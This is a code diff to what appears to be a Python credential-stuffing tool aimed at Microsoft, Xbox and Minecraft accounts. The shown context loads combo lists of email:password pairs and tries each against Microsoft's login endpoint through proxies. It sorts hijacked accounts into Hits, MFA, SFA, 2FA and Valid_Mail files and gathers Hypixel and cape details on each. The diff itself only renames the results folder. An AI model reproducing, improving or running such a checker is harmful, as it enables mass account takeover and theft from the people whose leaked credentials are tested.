@@ -22,7 +22,7 @@ sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C1
              "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 Combos = []
 proxylist = []
-day = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
+fname = ""
 hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries = 0,0,0,0,0,0,0,0,0,0,0,0
 urllib3.disable_warnings()
 
@@ -91,7 +91,7 @@ class Capture:
         global hits, mfa, sfa, cpm, checked
         if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
         hits+=1
-        with open(f"results/{day}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
+        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
         oname, olevel, ofirstlogin, olastlogin, osbcoins = Capture.hypixel(mc)
         cape = Capture.optifine(mc)
         access = "SFA"
@@ -100,13 +100,13 @@ class Capture:
             mfa+=1
             cpm+=1
             checked+=1
-            open(f"results/{day}/MFA.txt", 'a').write(f"{email}:{password}\n")
+            open(f"results/{fname}/MFA.txt", 'a').write(f"{email}:{password}\n")
         else: 
-            open(f"results/{day}/SFA.txt", 'a').write(f"{email}:{password}\n")
+            open(f"results/{fname}/SFA.txt", 'a').write(f"{email}:{password}\n")
             sfa+=1
             cpm+=1
             checked+=1
-        with open(f"results/{day}/Capture.txt", 'a') as file:
+        with open(f"results/{fname}/Capture.txt", 'a') as file:
             file.write(f'''Name: {mc}
 Email: {email}
 Password: {password}
@@ -179,7 +179,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             checked+=1
             cpm+=1
             if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
-            with open(f"results/{day}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
+            with open(f"results/{fname}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
             return None
         #bad
         elif any(value in login_request.text for value in ["Your account or password is incorrect." , "That Microsoft account doesn't exist. Enter a different account" , "Sign in to your Microsoft account" ]):
@@ -241,7 +241,7 @@ def authenticate(email, password):
                             vm+=1
                             cpm+=1
                             checked+=1
-                            with open(f"results/{day}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
+                            with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
                     else:
                         bad+=1
                         cpm+=1
@@ -279,13 +279,14 @@ def account(access_token, session):
         return "Unknown Name.", "Unknown Capes."
 
 def Load():
-    global Combos
+    global Combos, fname
     filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
     if filename is None:
         print(Fore.LIGHTRED_EX+"Invalid File.")
         time.sleep(2)
         Load()
     else:
+        fname = os.path.splitext(os.path.basename(filename.name))[0]
         try:
             with open(filename.name, 'r+', encoding='utf-8') as e:
                 lines = e.readlines()
@@ -488,7 +489,7 @@ def Main():
         print(Fore.LIGHTBLUE_EX+"Select your proxies")
         Proxys()
     if not os.path.exists("results"): os.makedirs("results/")
-    if not os.path.exists('results/'+day): os.makedirs('results/'+day)
+    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
     if screen == "'1'": cuiscreen()
     elif screen == "'2'": logscreen()
     else: cuiscreen()
